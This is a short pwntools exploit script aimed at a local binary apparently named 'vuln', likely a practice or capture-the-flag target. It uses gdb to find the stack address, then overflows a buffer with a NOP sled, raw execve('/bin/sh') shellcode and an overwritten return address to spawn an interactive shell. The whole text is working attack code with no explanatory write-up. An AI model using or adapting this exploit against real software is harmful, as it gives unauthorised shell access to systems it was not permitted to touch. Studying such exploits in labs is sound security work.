from pwn import p64,gdb,process
import re
import os
path = './vuln/vuln'

p = process([path,])
gdb.attach(p,f"b copy\nr {b'a'*(255+16)}\nni\nni\nset logging on\n x/1gx $rsp\nquit")
p.interactive()
p.close()
with open("gdb.txt") as f: addr = [i.group() for i in re.finditer(r'0x[\da-zA-Z]+(?=:)',f.readlines()[0])][0]
os.remove('gdb.txt')
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 
nop = b'\x90' * (0xff-len(shellcode))
addr = p64((int(addr,16)+len(nop)//2)).replace(b'\x00',b'')
payload = (nop+ shellcode+b'A'*9 + addr)
p= process([path, payload])#certainly unnecessary as we grab the correct address anyway, but who cares
p.interactive()
p.close()

#b *0x5555555551c8